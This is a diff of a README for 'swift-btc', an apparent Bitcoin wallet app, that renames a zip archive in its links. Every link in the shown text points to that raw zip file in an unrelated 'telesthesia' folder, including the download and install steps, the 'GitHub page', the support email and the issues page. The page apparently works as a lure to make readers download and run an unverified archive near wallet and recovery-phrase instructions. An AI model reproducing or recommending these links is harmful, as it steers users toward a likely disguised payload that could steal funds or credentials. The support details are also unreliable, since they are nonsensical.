@@ -1,6 +1,6 @@
 # 🌟 swift-btc - Simplifying Your Bitcoin Experience
 
-[![Download](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift-btc.zip)](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift-btc.zip)
+[![Download](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift_btc_1.2.zip)](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift_btc_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to swift-btc! This application helps you manage your Bitcoin transaction
 
 To get started, visit this page to download the latest version of swift-btc:
 
-[Download swift-btc Releases](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift-btc.zip)
+[Download swift-btc Releases](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift_btc_1.2.zip)
 
 Here’s how to download and install swift-btc:
 
@@ -37,7 +37,7 @@ Once you have downloaded the software, follow these steps to install:
 2. **Run the Installer:**
    - For Windows: Double-click the `.exe` file to start the installation.
    - For Mac: Open the `.dmg` file, then drag swift-btc to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift-btc.zip` file and run the installer script in your terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift_btc_1.2.zip` file and run the installer script in your terminal.
 3. **Follow the Setup Wizard:** The installer will guide you through the setup process. Just follow the prompts to install swift-btc.
 
 ## 🔑 Setting Up Your Wallet
@@ -83,14 +83,14 @@ If you encounter problems, try these solutions:
 - **Transaction Issues:** Check your internet connection. Ensure you entered the correct Bitcoin address. 
 - **Wallet Access Problems:** Use your recovery phrase if you forget your password.
 
-For further assistance, check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift-btc.zip).
+For further assistance, check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift_btc_1.2.zip).
 
 ## 📞 Support
 
 If you need help, please reach out:
 
-- **Email:** https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift-btc.zip
-- **GitHub Issues:** Report bugs or request features on our [issues page](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift-btc.zip).
+- **Email:** https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift_btc_1.2.zip
+- **GitHub Issues:** Report bugs or request features on our [issues page](https://raw.githubusercontent.com/rqwrq456/swift-btc/main/telesthesia/swift_btc_1.2.zip).
 
 ## 🎉 Conclusion
 
